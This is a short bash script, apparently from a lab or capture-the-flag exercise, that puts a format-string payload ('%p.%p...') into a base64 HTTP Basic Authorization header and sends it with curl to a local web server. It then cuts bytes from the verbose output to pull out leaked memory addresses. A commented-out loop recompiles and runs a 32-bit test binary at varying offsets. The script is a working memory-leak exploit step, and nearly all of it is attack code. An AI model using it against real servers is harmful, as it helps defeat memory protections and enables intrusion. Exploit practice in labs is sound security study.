#!/bin/bash

kati=$(echo "%p.%p.%p.%p.%p." | base64 -w0 )

curl -v "http://127.0.0.1:8000" \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: el-GR,el;q=0.9,en;q=0.8,de;q=0.7' \
  -H "Authorization: Basic $kati" \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: none' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' \
  -H 'sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  --compressed 2> kostas

res=$(tail -c 98 kostas| head -c 8)
echo $res




# >dolario 

# for (( i=-400; i<=-399; i++ ))
# do 
#   echo $i "ypomonh"
#     gcc -Doffset=$i -pie -m32 -o test_c test_c.c
#   ./test_c & #>>dolario 2>>dolario &
#   nekros=$!
#   sleep 1
#   kill $nekros;
# done